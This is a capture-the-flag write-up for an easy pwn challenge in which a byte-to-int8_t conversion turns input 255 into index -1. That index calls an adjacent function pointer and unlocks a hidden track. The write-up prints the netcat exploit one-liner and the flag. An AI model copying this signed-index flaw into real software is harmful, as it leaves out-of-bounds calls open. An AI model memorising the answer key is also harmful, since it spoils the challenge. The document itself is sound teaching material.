# B-Side
## Desc
> Author: Ariaf

The Hoshizora Summer Live archive was digitized into a tiny album player.

The case lists four tracks, but the player accepts a full byte as its track ID. Staff still insist that an encore was never released.

Find the track the catalog forgot.

![img](https://giffiles.alphacoders.com/780/78007.gif)

> Format: OSCAR{...}

---

> Author: Ariaf

Arsip Hoshizora Summer Live telah didigitalisasi menjadi sebuah pemutar album sederhana.

Sampul albumnya hanya mencantumkan empat lagu, tetapi pemutar tersebut menerima satu byte penuh sebagai ID lagu. Meski begitu, staf tetap bersikeras bahwa tidak pernah ada lagu encore yang dirilis.

Temukan lagu yang dilupakan oleh katalog.

![img](https://giffiles.alphacoders.com/780/78007.gif)

> Format: OSCAR{...}

## Hints
1. The catalog accepts more IDs than it has songs.
2. One byte can describe the same bits in more than one way.
3. Check both sides of a range, not only the upper bound.

## Chall
##### Setup
```bash
docker compose up -d
nc localhost 1337
```

This is an Easy pwn challenge. It is not a buffer overflow or ret2win challenge.
The intended sequence is:
```text
255 -> -1 -> maintenance mode -> 4 -> encore -> flag
```

The input is parsed as `0..255` and then converted to `int8_t`. The upper-bound-only validation lets `255` become `-1`. Because `maintenance` is stored immediately before `tracks`, `tracks[-1]` invokes the maintenance handler and unlocks the encore.

Once unlocked, `tracks[4]` reaches the function pointer immediately after the public track table and invokes the secret encore handler.

The challenge intentionally uses PIE, stack protection, full RELRO, and NX-compatible defaults. None of those mitigations address the signed-index and adjacent-function-pointer bug.

## Solution
```bash
printf '255\n4\n' | nc 127.0.0.1 1337
```

Expected sequence:
```text
Loading track -1...
♪ ??? — Archive Calibration
A hidden catalog entry has been restored.
The player now reports five tracks.
Loading track 4...
♪ Track 4 — Encore
This track was never printed on the album case.
OSCAR{the_real_track_was_never_on_the_case}
```

The flag is stored in `src/flag.txt` and copied to `/flag.txt` inside the container.

## Flag
OSCAR{the_real_track_was_never_on_the_case}
